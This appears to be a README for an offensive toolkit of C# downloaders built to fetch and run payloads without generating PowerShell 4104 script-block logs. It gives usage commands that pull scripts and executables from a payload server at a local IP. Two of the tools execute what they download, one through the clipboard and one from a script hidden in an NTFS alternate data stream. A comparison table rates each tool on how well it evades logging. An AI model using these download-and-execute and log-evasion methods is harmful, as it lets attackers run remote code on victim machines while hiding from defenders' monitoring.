# C# Downloader - No PowerShell 4104 Logging

## Build

```
build.bat
```

## Tools

### 1. Downloader.exe - WebClient (simple HTTP download)

```
Downloader.exe <url> <destination>
Downloader.exe http://192.168.1.2:8080/payloads/golang/hello.exe hello.exe
```

### 2. BitsDownloader.exe - BITS API (same mechanism as Start-BitsTransfer)

Requires server with Range header support (use `http-server/server.py`)

```
BitsDownloader.exe <url> <destination>
BitsDownloader.exe http://192.168.1.2:8080/payloads/golang/hello.exe hello.exe
```

### 3. ClipboardRunner.exe - Download to Clipboard + Execute

```
ClipboardRunner.exe <url> [-d]
ClipboardRunner.exe http://192.168.1.2:8080/ps1/runcmd.ps1      # download + execute
ClipboardRunner.exe http://192.168.1.2:8080/ps1/runcmd.ps1 -d   # download only
```

### 4. AdsRunner.exe - Download to Alternate Data Stream + Execute

```
AdsRunner.exe <url> [file] [stream] [-d]
AdsRunner.exe http://192.168.1.2:8080/ps1/runcmd.ps1                          # default: file.txt:hidden.ps1
AdsRunner.exe http://192.168.1.2:8080/ps1/runcmd.ps1 myfile.txt secret.ps1    # custom
AdsRunner.exe http://192.168.1.2:8080/ps1/runcmd.ps1 -d                       # download only
```

## Comparison

| Tool                | Log 4104 | Requires Range Header | Use Case                             |
| ------------------- | -------- | --------------------- | ------------------------------------ |
| Downloader.exe      | ❌       | ❌                    | Simple file download                 |
| BitsDownloader.exe  | ❌       | ✅                    | Resume support, bandwidth throttling |
| ClipboardRunner.exe | ❌       | ❌                    | Script via clipboard                 |
| AdsRunner.exe       | ❌       | ❌                    | Script hidden in NTFS ADS            |
